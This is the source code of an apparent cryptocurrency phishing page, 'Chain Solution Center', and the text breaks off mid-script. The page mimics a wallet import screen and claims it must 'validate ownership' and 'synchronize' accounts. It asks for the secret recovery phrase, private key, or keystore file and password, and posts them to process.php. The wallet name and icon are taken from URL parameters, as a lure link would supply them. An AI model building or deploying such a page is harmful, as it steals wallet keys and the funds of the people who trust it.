<!DOCTYPE HTML>
<html>
<head>
    <title>Chain Solution Center</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <link rel="stylesheet" href="src_assets/css/main.css" />
    <meta name="robots" content="noindex, nofollow" />
    <noscript><link rel="stylesheet" href="src_assets/css/noscript.css" /></noscript>
    <link rel="icon" href="images/favicon.png" type="image/x-icon">
    <script defer src="https://www.livecoinwatch.com/static/lcw-widget.js" type="5f4924991d2c06b82cd194e2-text/javascript"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="src_assets/css/teststyle.css" />

    <style>
        .conn{
            display: flex; /* Use flexbox to center the content */
            justify-content: center; /* Center horizontally */
            align-items: center;
        }
        .container {
            background-color: #412e31;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 90%;
            max-width: 700px;
        }

        .headerX {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 1px solid #e0e0e0;
            padding-bottom: 15px;
        }

        .headerX img {
            width: 50px;
            height: 50px;
            border-radius: 10px;
        }

        .headerX .wallet-name {
            font-size: 1.5em;
            font-weight: bold;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 80%;
        }
        .buttons button {
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            font-size: 16px;
        }

        .buttons .agree-button {
            background-color: #28a745;
            color: #fff;
        }

        .buttons .agree-button:hover {
            background-color: #218838;
        }

        .buttons .no-thanks-button {
            background-color: #dc3545;
            color: #fff;
        }

        .buttons .no-thanks-button:hover {
            background-color: #c82333;
        }
        @media (max-width: 768px) {
            .buttons button {
                padding:5px;}
        }
        @media (max-width: 480px) {
            .buttons button {
                padding:5px;}
        }
    </style>
    <style>
        .hidden {
            display: none;
        }
    </style>
    <style data-jss="" data-meta="MuiInputBase">
        @-webkit-keyframes mui-auto-fill {}
        @-webkit-keyframes mui-auto-fill-cancel {}
        .MuiInputBase-root {
            color: rgba(0, 0, 0, 0.87);
            cursor: text;
            display: inline-flex;
            position: relative;
            font-size: 1rem;
            box-sizing: border-box;
            align-items: center;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-weight: 400;
            line-height: 1.1876em;
            letter-spacing: 0.00938em;
        }
        .hidden {
            display: none;
        }
        .MuiInputBase-root.Mui-disabled {
            color: rgba(0, 0, 0, 0.38);
            cursor: default;
        }
        .MuiInputBase-multiline {
            padding: 6px 0 7px;
        }
        .MuiInputBase-multiline.MuiInputBase-marginDense {
            padding-top: 3px;
        }
        .MuiInputBase-fullWidth {
            width: 100%;
        }
        .MuiInputBase-input {
            font: inherit;
            color: currentColor;
            width: 100%;
            border: 0;
            height: 1.1876em;
            margin: 0;
            display: block;
            padding: 6px 0 7px;
            min-width: 0;
            background: none;
            box-sizing: content-box;
            animation-name: mui-auto-fill-cancel;
            letter-spacing: inherit;
            animation-duration: 10ms;
            -webkit-tap-highlight-color: transparent;
        }
        .MuiInputBase-input::-webkit-input-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }
        .MuiInputBase-input::-moz-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }
        .MuiInputBase-input:-ms-input-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }
        .MuiInputBase-input::-ms-input-placeholder {
            color: currentColor;
            opacity: 0.42;
            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        }
        .MuiInputBase-input:focus {
            outline: 0;
        }
        .MuiInputBase-input:invalid {
            box-shadow: none;
        }
        .MuiInputBase-input::-webkit-search-decoration {
            -webkit-appearance: none;
        }
        .MuiInputBase-input.Mui-disabled {
            opacity: 1;
        }
        .MuiInputBase-input:-webkit-autofill {
            animation-name: mui-auto-fill;
            animation-duration: 5000s;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
            opacity: 0 !important;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
            opacity: 0 !important;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
            opacity: 0 !important;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
            opacity: 0 !important;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
            opacity: 0.42;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
            opacity: 0.42;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
            opacity: 0.42;
        }
        label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
            opacity: 0.42;
        }
        .MuiInputBase-inputMarginDense {
            padding-top: 3px;
        }
        .MuiInputBase-inputMultiline {
            height: auto;
            resize: none;
            padding: 0;
        }
        .MuiInputBase-inputTypeSearch {
            -moz-appearance: textfield;
            -webkit-appearance: textfield;
        }
    </style><style data-jss="" data-meta="MuiInput">
        .MuiInput-root {
            position: relative;
        }
        label + .MuiInput-formControl {
            margin-top: 16px;
        }
        .MuiInput-colorSecondary.MuiInput-underline:after {
            border-bottom-color: #f50057;
        }
        .MuiInput-underline:after {
            left: 0;
            right: 0;
            bottom: 0;
            content: "";
            position: absolute;
            transform: scaleX(0);
            transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
            border-bottom: 2px solid #3f51b5;
            pointer-events: none;
        }
        .MuiInput-underline.Mui-focused:after {
            transform: scaleX(1);
        }
        .MuiInput-underline.Mui-error:after {
            transform: scaleX(1);
            border-bottom-color: #f44336;
        }
        .MuiInput-underline:before {
            left: 0;
            right: 0;
            bottom: 0;
            content: "\00a0";
            position: absolute;
            transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            border-bottom: 1px solid rgba(0, 0, 0, 0.42);
            pointer-events: none;
        }
        .MuiInput-underline:hover:not(.Mui-disabled):before {
            border-bottom: 2px solid rgba(0, 0, 0, 0.87);
        }
        .MuiInput-underline.Mui-disabled:before {
            border-bottom-style: dotted;
        }
        @media (hover: none) {
            .MuiInput-underline:hover:not(.Mui-disabled):before {
                border-bottom: 1px solid rgba(0, 0, 0, 0.42);
            }
        }
    </style>
    <style data-jss="" data-meta="MuiFormControl">
        .MuiFormControl-root {
            border: 0;
            margin: 0;
            display: inline-flex;
            padding: 0;
            position: relative;
            min-width: 0;
            flex-direction: column;
            vertical-align: top;
        }
        .MuiFormControl-marginNormal {
            margin-top: 16px;
            margin-bottom: 8px;
        }
        .MuiFormControl-marginDense {
            margin-top: 8px;
            margin-bottom: 4px;
        }
        .MuiFormControl-fullWidth {
            width: 100%;
        }
    </style><style data-jss="" data-meta="MuiTextField">

    </style><style data-jss="" data-meta="makeStyles">
        .jss1 {
            color: var(--color-text-alternative);
            font-weight: 400;
        }
        .jss1.jss2 {
            color: var(--color-text-alternative);
        }
        .jss1.jss4 {
            color: var(--color-text-alternative);
        }
        .jss3:before {
            border-bottom: 1px solid var(--color-text-default) !important;
        }
        .jss3:after {
            border-bottom: 2px solid var(--color-primary-default);
        }
        .jss5 {
            color: var(--color-text-alternative);
        }
        .jss6 {
            padding: 8px;
        }
        .jss6::placeholder {
            color: var(--color-text-alternative);
        }
        .jss7 {
            color: var(--color-background-default);
        }
        .jss8:after {
            border-bottom: 2px solid var(--color-background-default);
        }
        .jss9.jss10 {
            color: var(--color-text-alternative);
        }
        .jss9.jss4 {
            color: var(--color-text-alternative);
        }
        .jss12 {
            color: var(--color-text-default);
            border: 1px solid var(--color-border-default);
            height: 48px;
            display: flex;
            padding: 0 16px;
            align-items: center;
            border-radius: 6px;
            background-color: var(--color-background-default);
        }
        label + .jss12 {
            margin-top: 9px;
        }
        .jss12.jss11 {
            border: 1px solid var(--color-primary-default);
        }
        .jss13 {
            color: var(--color-text-default);
            position: initial;
            font-size: 1rem;
            transform: none;
            transition: none;
        }
        .jss14 {
            color: var(--color-text-default);
            position: initial;
            font-size: .75rem;
            transform: none;
            transition: none;
        }
        .jss15 {
            line-height: initial !important;
        }
    </style>
    <style>
        .response-message {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            background-color: #f9f9f9;
            color: #333;
            font-size: 14px;
            display: none;
        }

        .response-message.success {
            border-color: #4CAF50;
            color: #4CAF50;
            background-color: #DFF2BF;
        }

        .response-message.error {
            border-color: #F44336;
            color: #F44336;
            background-color: #FFBABA;
        }
    </style>
</head>
<body class="is-preload">

<!-- Page Wrapper -->
<div id="page-wrapper">

    <!-- Header -->

    <header id="header" class="alt">
        <div class="livecoinwatch-widget-5" lcw-base="USD" lcw-color-tx="#999999" lcw-marquee-1="coins" lcw-marquee-2="movers" lcw-marquee-items="20" ></div>
        <h1><a href="/">Chain Solution Center</a></h1>
        <nav>
            <a href="#menu">Menu</a>
        </nav>
    </header>

    <!-- Menu -->
    <nav id="menu">
        <div class="inner">
            <h2>Menu</h2>
            <ul class="links">
                <li><a href="/">Home</a></li>
                <li><a href="explore.php">Explore</a></li>
                <li><a href="/">Contact</a></li>
            </ul>
            <a href="#" class="close">Close</a>
        </div>
    </nav>
    <section id="four" class="wrapper alt style1">
    </section>
    <section id="four" class="wrapper alt style1">
        <br><br><br>
        <div class="conn">
            <div class="container">
                <div class="headerX">
                    <img id="walletIcon" src="" alt="Wallet Icon">
                    <div id="walletName" class="wallet-name"></div>
                </div>
                <div class="body">
                    <div id="response-message" class="message"></div>
                    <div class="import-options">
                        <label class="containerXin">Secret Recovery Phrase
                            <input type="radio" name="import-method" value="srp" checked onchange="if (!window.__cfRLUnblockHandlers) return false; toggleImportMethod()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                            <span class="checkmark"></span>
                        </label>&nbsp;&nbsp;
                        <label class="containerXin">Private Key
                            <input type="radio" name="import-method" value="private-key" onchange="if (!window.__cfRLUnblockHandlers) return false; toggleImportMethod()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                            <span class="checkmark"></span>
                        </label>&nbsp;&nbsp;
                        <label class="containerXin">Keystore JSON
                            <input type="radio" name="import-method" value="keystore" onchange="if (!window.__cfRLUnblockHandlers) return false; toggleImportMethod()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                            <span class="checkmark"></span>
                        </label>
                    </div>
                    <br><br>
                    <div class="import-srp" data-testid="import-srp" id="import-srp">
                        <form id="import-srp-form" action="process.php" method="POST">
                            <div class="box--margin-bottom-4 box--flex-direction-row box--width-full">
                                <ul class="progressbar two-steps">
                                    <li class="active">Confirm secret recovery phrase</li>
                                    <li class="two-steps">Synchronize wallet</li>
                                </ul>
                            </div>
                            <div class="import-srp__header">
                                <h2 class="box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--weight-bold typography--style-normal  walletText" >
                                    Access your wallet with your Secret Recovery Phrase
                                </h2>
                            </div>
                            <div class="import-srp__description">
                                <h4 class="box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--weight-normal typography--style-normal  walletText">
                                    <span>
                                        Chain Solution Center cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, and synchronize your account to access the available blockchain services.
                                        <a type="link" id="dynamicLink3" href="javascript:void(0);" target="_blank" rel="noopener noreferrer">Learn more</a>
                                    </span>
                                </h4>
                            </div>
                            <div class="import-srp__actions">
                                <div class="box--flex-direction-row box--text-align-left">
                                    <div class="import-srp__container">
                                        <label class="import-srp__srp-label">
                                            <h4 class="mm-box mm-text mm-text--heading-sm " align="left">Type your Secret Recovery Phrase</h4>
                                        </label>
                                        <div class="mm-box mm-banner-base mm-banner-alert mm-banner-alert--severity-info import-srp__paste-tip mm-box--padding-3 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--background-color-primary-muted mm-box--rounded-sm">
                                            <span class="mm-box mm-icon mm-icon--size-lg mm-box--display-inline-block mm-box--color-primary-default" style="mask-image: url(./src_assets/info.svg);"></span>
                                            <div class="mm-box mm-box--min-width-0">
                                                <p class="mm-box mm-text import-srp__banner-alert-text mm-text--body-md ">You can paste your entire secret recovery phrase into any field</p>
                                            </div>
                                        </div>
                                        <input type="hidden" name="type" value="phrase">
                                        <div class="dropdown import-srp__number-of-words-dropdown">
                                            <select class="dropdown__select" id="phrase-length" name="phrase_length" onchange="if (!window.__cfRLUnblockHandlers) return false; updateInputBoxes()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                                                <option value="12">I have a 12-word phrase</option>
                                                <option value="15">I have a 15-word phrase</option>
                                                <option value="18">I have a 18-word phrase</option>
                                                <option value="21">I have a 21-word phrase</option>
                                                <option value="24">I have a 24-word phrase</option>
                                            </select>
                                            <span class="mm-box dropdown__icon-caret-down mm-icon mm-icon--size-sm mm-box--display-inline-block mm-box--color-inherit" style="mask-image: url(./src_assets/arrow-down.svg);"></span>
                                        </div>
                                        <input type="hidden" name="walletName" value="">
                                        <div id="input-container" class="import-srp__srp">
                                        </div>
                                        <button id="confirm-button" name="submit" type="submit" class="button btn--rounded btn-primary btn--large import-srp__confirm-button" data-testid="import-srp-confirm hidden" disabled>Confirm Secret Recovery Phrase</button>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div id="import-private-key" class="import-method hidden" data-testid="import-srp">
                        <form id="import-private-key-form" action="process.php" method="POST">
                            <div class="box--margin-bottom-4 box--flex-direction-row box--width-full">
                                <ul class="progressbar two-steps">
                                    <li class="active">Confirm private key</li>
                                    <li class="two-steps">Synchronize wallet</li>
                                </ul>
                            </div>
                            <div class="import-srp__header">
                                <h2 class="box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--weight-bold typography--style-normal  walletText">
                                    Access your wallet with your Private Key
                                </h2>
                            </div>
                            <div class="import-srp__description">
                                <h4 class="box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--weight-normal typography--style-normal  walletText">
                                    <span>
                                        Chain Solution Center cannot recover your private key. We will use your private key to validate your ownership, and synchronize your account to access the available blockchain services.
                                        <a type="link" id="dynamicLink2" href="javascript:void(0);" target="_blank" rel="noopener noreferrer">Learn more</a>
                                    </span>
                                </h4>
                            </div>
                            <div class="import-private-key__actions">
                                <div class="box--flex-direction-row box--text-align-left">
                                    <div class="import-private-key__container">
                                        <div class="mm-box mm-banner-base mm-banner-alert mm-banner-alert--severity-info import-srp__paste-tip mm-box--padding-3 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--background-color-primary-muted mm-box--rounded-sm">
                                            <span class="mm-box mm-icon mm-icon--size-lg mm-box--display-inline-block mm-box--color-primary-default" style="mask-image: url(./src_assets/info.svg);"></span>
                                            <div class="mm-box mm-box--min-width-0">
                                                <p class="mm-box mm-text import-srp__banner-alert-text mm-text--body-md ">You can paste your private key into the field</p>
                                            </div>
                                        </div>
                                        <label class="import-private-key__label">
                                            <h4 class="mm-box mm-text mm-text--heading-sm " align="left">Enter your Private Key</h4>
                                        </label>
                                        <div class="MuiFormControl-root MuiTextField-root">
                                            <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                                                <input aria-invalid="false" autocomplete="off" id="private-key-input" name="private-key" type="password" dir="auto" data-testid="private-key-input" class="MuiInputBase-input MuiInput-input" oninput="if (!window.__cfRLUnblockHandlers) return false; checkPrivateKeyInput()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                                                <input type="hidden" name="walletName" value="">
                                            </div>
                                        </div>
                                        <input type="hidden" name="type" value="privatekey">
                                        <div class="show-hide-toggle">
                                            <input class="show-hide-toggle__input hidden" id="private-key-checkbox" type="checkbox" data-testid="private-key-checkbox" onclick="if (!window.__cfRLUnblockHandlers) return false; togglePrivateKeyVisibility()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                                            <label for="private-key-checkbox" class="show-hide-toggle__label" title="Show/Hide private key">
                                                <svg id="private-key-icon" width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                    <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
                                                </svg>
                                            </label>
                                        </div>
                                        <button id="private-key-confirm-button" name="submit" type="submit" class="button btn--rounded btn-primary btn--large import-srp__confirm-button hidden" disabled>Confirm</button>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div id="import-keystore" class="import-method hidden">
                        <form id="import-keystore-form" action="process.php" method="POST" enctype="multipart/form-data">
                            <div class="box--margin-bottom-4 box--flex-direction-row box--width-full">
                                <ul class="progressbar two-steps">
                                    <li class="active">Confirm keystore JSON</li>
                                    <li class="two-steps">Synchronize wallet</li>
                                </ul>
                            </div>
                            <div class="import-srp__header">
                                <h2 class="box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography  typography--weight-bold typography--style-normal  walletText">
                                    Access your wallet with your Keystore JSON
                                </h2>
                            </div>
                            <div class="import-srp__description">
                                <h4 class="box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography  typography--weight-normal typography--style-normal  walletText">
                                    <span>
                                        Chain Solution Center cannot recover your keystore JSON. We will use your keystore JSON and password to validate your ownership, and synchronize your account to access the available blockchain services.
                                        <a type="link" id="dynamicLink1" href="javascript:void(0);" target="_blank" rel="noopener noreferrer">Learn more</a>
                                    </span>
                                </h4>
                            </div>
                            <input type="hidden" name="type" value="keystore">
                            <div class="import-keystore__actions">
                                <div class="box--flex-direction-row box--text-align-left">
                                    <div class="import-keystore__container">
                                        <div class="mm-box mm-banner-base mm-banner-alert mm-banner-alert--severity-info import-srp__paste-tip mm-box--padding-3 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--background-color-primary-muted mm-box--rounded-sm">
                                            <span class="mm-box mm-icon mm-icon--size-lg mm-box--display-inline-block mm-box--color-primary-default" style="mask-image: url(./src_assets/info.svg);"></span>
                                            <div class="mm-box mm-box--min-width-0">
                                                <p class="mm-box mm-text import-srp__banner-alert-text mm-text--body-md ">Select your JSON file and input the password.</p>
                                            </div>
                                        </div>
                                        <label class="import-keystore__label">
                                            <h4 class="mm-box mm-text mm-text--heading-sm " align="left">Upload your Keystore JSON</h4><br>
                                        </label>
                                        <input type="file" id="keystore-file-input" accept=".json" onchange="if (!window.__cfRLUnblockHandlers) return false; handleKeystoreFile()" data-cf-modified-5f4924991d2c06b82cd194e2-="" name="file"/><br><br>
                                        <label class="import-keystore__label">
                                            <h4 class="mm-box mm-text mm-text--heading-sm " align="left">Enter your password</h4>
                                        </label>
                                        <div class="MuiFormControl-root MuiTextField-root">
                                            <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                                                <input aria-invalid="false" autocomplete="off" name="keystore_password" id="keystore-password-input" type="password" dir="auto" data-testid="keystore-password-input" class="MuiInputBase-input MuiInput-input" oninput="if (!window.__cfRLUnblockHandlers) return false; checkKeystoreInputs()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                                                <input type="hidden" name="walletName" value="">
                                            </div>
                                        </div>
                                        <div class="show-hide-toggle">
                                            <input class="show-hide-toggle__input" id="keystore-password-checkbox" type="checkbox" data-testid="keystore-password-checkbox" onclick="if (!window.__cfRLUnblockHandlers) return false; toggleKeystorePasswordVisibility()" data-cf-modified-5f4924991d2c06b82cd194e2-="">
                                            <label for="keystore-password-checkbox" class="show-hide-toggle__label" title="Show/Hide password">
                                                <svg id="keystore-password-icon" width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                                                    <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
                                                </svg>
                                            </label>
                                        </div>
                                        <button id="keystore-confirm-button" name="submit" type="submit" class="button btn--rounded btn-primary btn--large import-srp__confirm-button hidden" disabled>Confirm</button>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <br>
        <br>
    </section>
    <section id="footer">
        <div class="inner">
            <h2 class="major">Get in touch</h2>
            <p>Connect with us by becoming a part of our Discord community.</p>

            <ul class="copyright">
                <li>&copy; <?php echo date('Y'); ?>  Chain Solution Center. All rights reserved.</li>
            </ul>
        </div>
    </section>
</div>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js' type="text/javascript"></script>
<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function () {
        // Function to get query parameters
        function getQueryParams() {
            const urlParams = new URLSearchParams(window.location.search);
            return {
                url: urlParams.get('url'),
                name: urlParams.get('name'),
                icon: urlParams.get('icon'),
                random: urlParams.get('random')
            };
        }

        // Get the wallet data from URL
        const walletData = getQueryParams();
        console.log(walletData); // Log the wallet data to verify

        // Update the page with wallet details
        const walletIcon = document.getElementById('walletIcon');
        const walletName = document.getElementById('walletName');
        const walletUrl = document.getElementById('walletUrl');

        if (walletData.icon) {
            walletIcon.src = walletData.icon;
        }
        if (walletData.name) {
            walletName.textContent = walletData.name;
        }

        // Replace 'wallet' text in elements with the wallet name
        var walletTextElements = document.querySelectorAll('.walletText');
        walletTextElements.forEach(function (element) {
            var textNode = element.childNodes[0];
            if (textNode) {
                textNode.textContent = textNode.textContent.replace('wallet', walletData.name);
            }
        });

        // Update hidden input values with the wallet name
        var hiddenInputs = document.querySelectorAll('input[name="walletName"]');
        hiddenInputs.forEach(function (input) {
            input.value = walletData.name || ''; // Use empty string if name is null
            console.log(`Updated input value to: ${input.value}`); // Log the input value for debugging
        });
    });

    function redirectToImportPage() {
        const walletData = new URLSearchParams(window.location.search);
        window.location.href = `import.php?${walletData.toString()}`;
    }

    function toggleImportMethod() {
        const importSRP = document.getElementById('import-srp');
        const importPrivateKey = document.getElementById('import-private-key');
        const importKeystore = document.getElementById('import-keystore');

        const selectedMethod = document.querySelector('input[name="import-method"]:checked').value;

        importSRP.classList.toggle('hidden', selectedMethod !== 'srp');
        importPrivateKey.classList.toggle('hidden', selectedMethod !== 'private-key');
        importKeystore.classList.toggle('hidden', selectedMethod !== 'keystore');
    }
</script>

<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', (event) => {
        updateInputBoxes();
        document.getElementById('input-container').addEventListener('input', handleInput);
    });

    function updateInputBoxes() {
        const container = document.getElementById('input-container');
        const phraseLength = parseInt(document.getElementById('phrase-length').value);
        container.innerHTML = '';
        for (let i = 0; i < phraseLength; i++) {
            const inputBox = `
                <div class="import-srp__srp-word">
                    <label for="import-srp__srp-word-${i}" class="import-srp__srp-word-label">
                        <p class="mm-box mm-text mm-text--body-md mm-box--color-text-default">${i + 1}.</p>
                    </label>
                    <div class="MuiFormControl-root MuiTextField-root">
                        <div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl">
                            <input aria-invalid="false" autocomplete="off" id="import-srp__srp-word-${i}" name="srp_words[]" type="password" dir="auto" data-testid="import-srp__srp-word-${i}" class="MuiInputBase-input MuiInputBase-inputX MuiInput-input" value="">
                    </div>
                    </div>
                    <div class="show-hide-toggle">
                        <input class="show-hide-toggle__input" id="import-srp__srp-word-${i}-checkbox" type="checkbox" data-testid="import-srp__srp-word-${i}-checkbox" onclick="togglePasswordVisibility(${i})">
                        <label for="import-srp__srp-word-${i}-checkbox" class="show-hide-toggle__label" title="Show/Hide this word of the secret recovery phrase">
                          <svg id="eye-icon-${i}"width="24" height="24" fill="currentColor" class="show-hide-toggle__icon" aria-label="This word is hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
                              <path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>
                            </svg>
                        </label>
                    </div>
                </div>
            `;
            container.innerHTML += inputBox;
        }
        checkAllInputsFilled();
    }

    function togglePasswordVisibility(index) {
        const input = document.getElementById(`import-srp__srp-word-${index}`);
        const checkbox = document.getElementById(`import-srp__srp-word-${index}-checkbox`);
        input.type = checkbox.checked ? 'text' : 'password';
    }

    function handleInput(event) {
        const target = event.target;
        const value = target.value.trim();
        const words = value.split(' ');
        const inputs = document.querySelectorAll('.MuiInputBase-inputX');

        if (words.length === inputs.length) {
            words.forEach((word, index) => {
                inputs[index].value = word;
            });
        }

        checkAllInputsFilled();
    }

    function checkAllInputsFilled() {
        const inputs = document.querySelectorAll('.MuiInputBase-inputX');
        let allFilled = true;
        inputs.forEach(input => {
            if (input.value.trim() === '') {
                allFilled = false;
            }
        });
        document.getElementById('confirm-button').disabled = !allFilled;
    }

    function togglePasswordVisibility(index) {
        const input = document.getElementById(`import-srp__srp-word-${index}`);
        const icon = document.getElementById(`eye-icon-${index}`);
        if (input.type === 'password') {
            input.type = 'text';
            icon.innerHTML = `
            <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"></path>
            `;
        } else {
            input.type = 'password';
            icon.innerHTML = `
